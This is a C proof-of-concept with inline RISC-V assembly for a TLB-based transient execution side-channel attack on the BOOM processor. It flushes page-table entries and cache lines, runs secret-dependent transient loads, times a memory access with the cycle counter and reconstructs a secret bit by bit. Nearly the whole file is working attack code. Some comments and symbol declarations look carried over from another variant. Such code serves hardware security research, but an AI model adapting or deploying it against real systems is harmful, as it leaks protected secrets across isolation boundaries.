/* TLB based transient execution attack on risc-v BOOM
 *
 * TLB of Boom CPU can be updated by transient instructions.
 * Thus, it can be used as a timing side channel, leaking secret.
 */

#include <stdio.h>
#include <stdint.h>
#include "util.h"
#include "encoding.h"

extern uint8_t data0[];
extern uint8_t data1[];
extern uint8_t secret[];

#define S_WORD 32

void transient(uint64_t idx) {
    // Flush all PTEs (for deterministic)
    asm volatile("sfence.vma zero, zero");

    // Flush all cache line conflicting with target line
    asm volatile("la a1, conflict0 + 64\n"
                 "ld a2, 0(a1)\n"
                 "la a1, conflict1 + 64\n"
                 "ld a2, 0(a1)\n"
                 "la a1, conflict2 + 64\n"
                 "ld a2, 0(a1)\n"
                 "la a1, conflict3 + 64\n"
                 "ld a2, 0(a1)\n"
                 "la a1, conflict4 + 64\n"
                 "ld a2, 0(a1)\n"
                 "la a1, conflict5 + 64\n"
                 "ld a2, 0(a1)\n"
                 "la a1, conflict6 + 64\n"
                 "ld a2, 0(a1)\n"
                 "la a1, conflict7 + 64\n"
                 "ld a2, 0(a1)\n");

    asm volatile("fence\n");

    // Fetch PTE and cache line only for the secret address
    asm volatile("la gp, 1f\n"
                 "la a5, data0\n"
                 "la a1, data2\n"
                 "la a4, secret\n"
                 "li a2, 256\n"
                 "li a3, 2\n"
                 "fcvt.s.lu fa4, a3\n"
                 "fcvt.s.lu fa5, a2\n"
                 "fdiv.s    fa5, fa5, fa4\n"
                 "fdiv.s    fa5, fa5, fa4\n"
                 "fcvt.lu.s a2, fa5\n"
                 "add a1, a1, a2\n"
                 "ld a2, 0(a1)\n"
                 "ld a3, 0(a4)\n"
                 "srl a3, a3, a0\n"
                 "andi a3, a3, 1\n"
                 "slli a3, a3, 12\n"
                 "add a5, a5, a3\n"
                 "ld a5, 0(a5)\n"
                 "1: li gp, 0\n");

    return;
}

int main(void) {
    uint64_t sec = 0xdeadbeef;
    uint8_t bits[S_WORD] = {0,};
    uint8_t votes[S_WORD] = {0,};

    uint64_t start, end, dummy;

    printf("[*] New transient execution attack on BOOM\n");

    for (int idx = S_WORD - 1; idx >= 0; idx--) {
        printf("[%2d] Want(%d) Cycles: ", idx, (int) ((sec >> idx) & 1));
        uint64_t cycles[TRIAL] = {0, };
        for (int t = 0; t < TRIAL; t++) {

            transient(idx);

            asm volatile("csrr %0, cycle\n"
                         : "=r"(start));
            dummy = data0[64];
            asm volatile("csrr %0, cycle\n"
                         : "=r"(end));

            cycles[t] = end - start;
            printf("%ld ", cycles[t]);
        }

        int sum = 0;
        for (int t = 0; t < TRIAL; t++) {
            if (cycles[t] > 65)
                sum++;
        }

        // We prioritize sum since BIM entry should not be updated at all when secret is 0
        bits[idx] = (sum > TRIAL/2)? 1:0;
        votes[idx] = (sum > TRIAL/2)? sum:TRIAL - sum;

        printf(" --> %d (%d/%d)\n", bits[idx], votes[idx], TRIAL);
    }

    printf("[*] Secret: 0x");
    for (int idx = S_WORD - 4; idx >= 0; idx-=4) {
        uint16_t hex = bits[idx+3] << 3 | bits[idx+2] << 2 | bits[idx+1] << 1 | bits[idx];
        printf("%x", hex);
    }
    printf("\n");

    return 0;
}
